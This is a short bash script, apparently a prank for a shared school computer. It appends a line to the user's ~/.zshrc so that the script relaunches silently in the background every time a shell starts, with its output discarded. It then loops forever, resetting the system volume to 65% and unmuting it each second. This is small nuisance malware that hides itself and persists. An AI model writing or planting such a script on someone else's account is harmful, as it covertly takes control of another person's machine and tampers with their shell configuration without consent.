#!/bin/bash

if ! grep -q "/sgoinfre/goinfre/Perso/mochamsa/troll/sound-lock.sh" ~/.zshrc 2>/dev/null; then
    cat << EOF >> ~/.zshrc
nohup /sgoinfre/goinfre/Perso/mochamsa/troll/sound-lock.sh > /dev/null 2>&1 &
EOF
fi

while true; do
    pactl set-sink-volume @DEFAULT_SINK@ 65%
    pactl set-sink-mute @DEFAULT_SINK@ 0
    sleep 1
done
